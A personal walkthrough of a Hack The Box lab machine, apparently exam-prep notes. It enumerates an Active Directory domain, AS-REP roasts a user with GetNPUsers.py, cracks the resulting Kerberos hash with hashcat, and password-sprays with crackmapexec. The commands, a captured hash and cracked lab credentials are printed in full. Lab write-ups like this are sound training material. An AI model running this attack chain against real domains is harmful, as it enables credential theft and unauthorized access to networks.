
```
enum4linux -a 10.10.10.175
```

```
Domain Name: EGOTISTICALBANK                                                  
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
```

Let's get some valid users as we came to know about the Domain Name
```
kerbrute userenum -d EGOTISTICALBANK --dc 10.10.10.175 userlist.txt -t  100
```

```
2024/05/01 05:30:52 >  [+] VALID USERNAME:       administrator@EGOTISTICALBANK
2024/05/01 05:31:09 >  [+] VALID USERNAME:       hsmith@EGOTISTICALBANK
2024/05/01 05:31:12 >  [+] VALID USERNAME:       Administrator@EGOTISTICALBANK
2024/05/01 05:31:21 >  [+] VALID USERNAME:       fsmith@EGOTISTICALBANK
```
![[Pasted image 20240501053829.png]]

So we are getting something even though we are got nothing from smb for not will enumerate it later. Will see asproasting and see if we get any ticket hash or not.

Users we got
```
administrator@EGOTISTICALBANK
hsmith@EGOTISTICALBANK
Administrator@EGOTISTICALBANK
fsmith@EGOTISTICALBANK
```

Don't do this mistake in the exam
we have to provide the Domain name and not the host name for the attack
![[Pasted image 20240501054417.png]]

ASProasting
```
GetNPUsers.py EGOTISTICALBANK/ -usersfile valid_user.txt -format john -dc-ip 10.10.10.175
```
![[Pasted image 20240501054433.png]]

```
$krb5asrep$fsmith@EGOTISTICALBANK@EGOTISTICALBANK:ac1285fbd11b34772846f44a434c0bd7$8dd65bb22872b02a09fabf87fee11a01bd86250c429f91a7a1ba8e07d0f5e31adc6996b46b9c32c6f2a67d63fffbc15b32fb8a2f674804e60d9ffc26e956427ac6f2a7ca2e18bc017e1e775d72e86d936febbe0fdd84b6ec561b853e020c0d6f660e0afa659c500c6f92e43ce019dc120e7de3cb0db2e1b17be30a4569e6686aa16b276941d1b5c8bb7fd1a77a2b43367b285939700d3248aecc537b36dcb3e9bb0f06f08b29b2d019685e724c244d35d52cbcb0df03f33a15be35e099a112c20a63fe6f1e2dda21adc0bb9f18cf5788e401a16836fcf837b1580c8ecfbdd240c2eca5ee19de40a475410d2c77a298f7d555fcc76ae7e2ea0b
```

So let's see if we can crack it or not.

Hashcat
https://hashcat.net/wiki/doku.php?id=example_hashes
![[Pasted image 20240501054727.png]]

```
 .\hashcat.exe -m 18200 -D 2 .\hashes4.txt .\rockyou.txt -O
```
![[Pasted image 20240501054841.png]]

Username:
```
fsmith
```

```
Thestrokes23
```


If we want to see like this password is valid for any user than we can do it in this way
```
crackmapexec smb 10.10.10.175 -u ~root/HackTheBox/Sauna/valid_user.txt -p Washington10URedmond10U
```

